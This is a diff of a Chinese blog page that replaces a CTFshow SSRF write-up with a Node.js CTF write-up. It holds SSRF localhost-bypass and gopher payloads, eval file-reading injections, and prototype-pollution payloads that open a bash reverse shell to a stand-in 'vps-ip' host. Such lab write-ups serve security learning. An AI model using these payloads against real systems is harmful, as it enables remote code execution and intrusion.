@@ -16,23 +16,21 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="CTFshow WriteUps WEB入门 SSRFweb351 &#96;&#96;&#96;url&#x3D;127.0.0.1&#x2F;flag.php12345678910### web352- 过滤了localhost和127.0.0.1- &#96;&#96;&#96;  url&#x3D;http:&#x2F;&#x2F;0&#x2F;flag.php  url&#x3D;http:&#x2F;&#x2F;0.0.0.0&#x2F;flag.php  url&#x3D;http:&#x2F;&#x2F;0x7f">
+    <meta name="description" content="CTFshow WriteUps WEB入门 nodejsweb334 代码审计一下 12ctfshow123456  web335 查看源吗发现提示eval  eval中可以执行js代码  利用注入fs模块  &#96;&#96;&#96;&#x2F;?eval&#x3D;require(‘fs’).readdirSync(‘.’)&#x2F;?eval&#x3D;require(‘fs’).r">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF_show_Web入门_SSRF">
-<meta property="og:url" content="http://example.com/2022/07/26/CTF_show_Web%E5%85%A5%E9%97%A8_SSRF/index.html">
+<meta property="og:title" content="CTF_show_Web入门_nodejs">
+<meta property="og:url" content="http://example.com/2022/07/31/CTF_show_Web%E5%85%A5%E9%97%A8_nodejs/index.html">
 <meta property="og:site_name" content="luelueking的ctf之路">
-<meta property="og:description" content="CTFshow WriteUps WEB入门 SSRFweb351 &#96;&#96;&#96;url&#x3D;127.0.0.1&#x2F;flag.php12345678910### web352- 过滤了localhost和127.0.0.1- &#96;&#96;&#96;  url&#x3D;http:&#x2F;&#x2F;0&#x2F;flag.php  url&#x3D;http:&#x2F;&#x2F;0.0.0.0&#x2F;flag.php  url&#x3D;http:&#x2F;&#x2F;0x7f">
+<meta property="og:description" content="CTFshow WriteUps WEB入门 nodejsweb334 代码审计一下 12ctfshow123456  web335 查看源吗发现提示eval  eval中可以执行js代码  利用注入fs模块  &#96;&#96;&#96;&#x2F;?eval&#x3D;require(‘fs’).readdirSync(‘.’)&#x2F;?eval&#x3D;require(‘fs’).r">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/68fcffdc46eb4b2a3c4413a64319621d.png">
-<meta property="article:published_time" content="2022-07-26T11:34:59.000Z">
-<meta property="article:modified_time" content="2022-07-26T14:15:46.219Z">
+<meta property="article:published_time" content="2022-07-31T11:34:59.000Z">
+<meta property="article:modified_time" content="2022-07-30T01:15:17.551Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/img_convert/68fcffdc46eb4b2a3c4413a64319621d.png">
   
   
   
-  <title>CTF_show_Web入门_SSRF - luelueking的ctf之路</title>
+  <title>CTF_show_Web入门_nodejs - luelueking的ctf之路</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -197,7 +195,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="CTF_show_Web入门_SSRF"></span>
+            <span id="subtitle" data-typed-text="CTF_show_Web入门_nodejs"></span>
           
         </div>
 
@@ -208,8 +206,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-07-26 19:34" pubdate>
-          2022年7月26日 晚上
+        <time datetime="2022-07-31 19:34" pubdate>
+          2022年7月31日 晚上
         </time>
       </span>
     
@@ -220,7 +218,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          874 字
+          2.4k 字
         
       </span>
     
@@ -231,7 +229,7 @@
         
         
         
-          8 分钟
+          20 分钟
         
       </span>
     
@@ -269,50 +267,77 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">CTF_show_Web入门_SSRF</h1>
+            <h1 style="display: none">CTF_show_Web入门_nodejs</h1>
             
             
               <div class="markdown-body">
                 
                 <h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr>
 <h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr>
-<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><ul>
-<li>&#96;&#96;&#96;<br>url&#x3D;127.0.0.1&#x2F;flag.php<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment">### web352</span><br><br>- 过滤了localhost和<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><br>- ```<br>  url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>/flag.php<br>  url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>/flag.php<br>  url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>x7f.<span class="hljs-number">0.0</span>.<span class="hljs-number">1</span>/flag.php<br>  url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0177.0</span>.<span class="hljs-number">0.1</span>/flag.php<br></code></pre></td></tr></table></figure></li>
+<h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><h3 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h3><ul>
+<li><p>代码审计一下</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ctfshow</span><br><span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure></li>
 </ul>
-<h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><ul>
-<li>同352</li>
-</ul>
-<h3 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h3><ul>
-<li><p><strong>将域名解析的A记录指向127.0.0.1即可，下面用的域名sudo.cc已指向127.0.0.1</strong></p>
+<h3 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h3><ul>
+<li><p>查看源吗发现提示eval</p>
 </li>
-<li><p>&#96;&#96;&#96;<br>url&#x3D;<a target="_blank" rel="noopener" href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a></p>
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web355~<span class="hljs-number">356</span><br><br>- ```<br>  url=http:<span class="hljs-comment">//0/flag.php</span><br></code></pre></td></tr></table></figure></li>
+<li><p>eval中可以执行js代码</p>
+</li>
+<li><p>利用注入fs模块</p>
+</li>
+<li><p>&#96;&#96;&#96;<br>&#x2F;?eval&#x3D;require(‘fs’).readdirSync(‘.’)<br>&#x2F;?eval&#x3D;require(‘fs’).readFileSync(‘fl00g.txt’)</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web336<br><br>- ```<br>  /?eval=require(<span class="hljs-string">&#x27;fs&#x27;</span>).readFileSync(<span class="hljs-string">&#x27;fl001g.txt&#x27;</span>)<br></code></pre></td></tr></table></figure></li>
 </ul>
-<h3 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h3><ul>
-<li>&#96;&#96;&#96;<br>url&#x3D;<a target="_blank" rel="noopener" href="http://118.178.126.49/ssrf.php">http://118.178.126.49/ssrf.php</a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- ssrf.php<br><br>- ```php<br>  <span class="hljs-meta">&lt;?php</span> <br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>);<br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><ul>
-<li><pre><code class="php">&lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-$url=$_POST[&#39;url&#39;];
-$x=parse_url($url);
-if(preg_match(&#39;/^http:\/\/ctf\..*show$/i&#39;,$url))&#123;
-    echo file_get_contents($url);
-&#125;
+<h3 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h3><ul>
+<li><p>分析代嘛要求md5加密后一样</p>
+</li>
+<li><pre><code class="hljs">/?a[]=1&amp;b[]=1
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><br>### web338<br><br>- js的原型链污染<br>  - js的每个构造函数（<span class="hljs-function"><span class="hljs-keyword">constructor</span>）都有一个原型对象（<span class="hljs-title">prototype</span>）</span><br><span class="hljs-function">  - 对象的```__<span class="hljs-title">proto__</span>```属性,指向类的原型对象<span class="hljs-title">prototype</span></span><br><span class="hljs-function">  - <span class="hljs-title">js</span>使用<span class="hljs-title">prototype</span>链实现继承机制</span><br><span class="hljs-function"></span><br><span class="hljs-function">- <span class="hljs-title">payload</span>，<span class="hljs-title">POST</span>抓包加参数</span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure>
+&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>### web339<br><br>- 发现多了一个api.js<br><br>- 里面的query参数可以污染！<br><br>- ```<br>  &#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;</span>bash -i &gt;&amp; /dev/tcp/vps-ip/<span class="hljs-number">9999</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>\<span class="hljs-string">&quot;&#x27;)&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>
 </code></pre>
 </li>
-<li><p>要求以<a href="http://ctf.开头，以show结尾：`url=http://ctf.@127.0.0.1/flag.php?show`">http://ctf.开头，以show结尾：`url=http://ctf.@127.0.0.1/flag.php?show`</a></p>
+<li><p>POST index后再POST api（触发路由）</p>
+</li>
+<li><p>服务器开9999监听，反弹shell</p>
+</li>
+<li><p>flag在login.js里面</p>
 </li>
 </ul>
-<h3 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h3><ul>
-<li>Gopher协议打无密码的mysql</li>
-<li>使用Gopherus</li>
-</ul>
-<h3 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h3><ul>
-<li><p><img src="https://img-blog.csdnimg.cn/img_convert/68fcffdc46eb4b2a3c4413a64319621d.png" srcset="/img/loading.gif" lazyload alt="ssrfweb360gopher"></p>
+<h3 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h3><ul>
+<li><p>二次污染</p>
 </li>
-<li><p>&#x2F;?cmd&#x3D;tac &#x2F;flaaag</p>
+<li><pre><code class="hljs">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps-ip/9999 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>### web341<br><br>- **EJS两层原型污染**<br><br>- ```<br>  &#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;outputFuncionName&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;</span>bash -i &gt;&amp; /dev/tcp/vps-ip/<span class="hljs-number">9999</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>\<span class="hljs-string">&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p>访问routes下flag.js于是猜测flag配在环境中</p>
+</li>
+<li><p>env找到flag</p>
+</li>
+</ul>
+<h3 id="web342～343"><a href="#web342～343" class="headerlink" title="web342～343"></a>web342～343</h3><ul>
+<li><p>jade原型链污染</p>
+</li>
+<li><p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p>
+</li>
+<li><pre><code class="hljs">&#123;
+  &quot;__proto__&quot;: &#123;
+    &quot;__proto__&quot;: &#123;
+      &quot;type&quot;: &quot;Block&quot;,
+      &quot;nodes&quot;: &quot;&quot;,
+      &quot;compileDebug&quot;: 1,
+      &quot;self&quot;: 1,
+      &quot;line&quot;: &quot;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps-ip/9999 0&gt;&amp;1\&quot;&#39;)&quot;
+    &#125;
+  &#125;
+&#125;
+
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- 记得修改Content-Type为application/json<br><br>- env拿flag<br><br>### web344<br><br>- 正常情况下需要传入```?query=&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;ctfshow&quot;</span>,<span class="hljs-string">&quot;isVIP&quot;</span>:<span class="hljs-literal">true</span>&#125;```<br><br>- 但是题目过滤了逗号<br><br>- 所以<br><br></code></pre></td></tr></table></figure>
+?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;
+</code></pre>
+</li>
+<li><p>nodejs中会把它们拼接，ctfshow中c编码的原因是双引号的url编码是%22和c连起来是%22c，会匹配到正则表达式。</p>
 </li>
 </ul>
 
@@ -353,8 +378,8 @@ if(preg_match(&#39;/^http:\/\/ctf\..*show$/i&#39;,$url))&#123;
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>CTF_show_Web入门_SSRF</div>
-      <div>http://example.com/2022/07/26/CTF_show_Web入门_SSRF/</div>
+      <div>CTF_show_Web入门_nodejs</div>
+      <div>http://example.com/2022/07/31/CTF_show_Web入门_nodejs/</div>
     </div>
     <div class="license-meta">
       
@@ -366,7 +391,7 @@ if(preg_match(&#39;/^http:\/\/ctf\..*show$/i&#39;,$url))&#123;
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年7月26日</div>
+          <div>2022年7月31日</div>
         </div>
       
       
@@ -396,18 +421,12 @@ if(preg_match(&#39;/^http:\/\/ctf\..*show$/i&#39;,$url))&#123;
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/07/31/CTF_show_Web%E5%85%A5%E9%97%A8_nodejs/" title="CTF_show_Web入门_nodejs">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CTF_show_Web入门_nodejs</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/07/24/CTF_show_Web%E5%85%A5%E9%97%A8_XSS/" title="CTF_show_Web入门_XSS">
-                        <span class="hidden-mobile">CTF_show_Web入门_XSS</span>
+                      <a href="/2022/07/26/CTF_show_Web%E5%85%A5%E9%97%A8_SSRF/" title="CTF_show_Web入门_SSRF">
+                        <span class="hidden-mobile">CTF_show_Web入门_SSRF</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
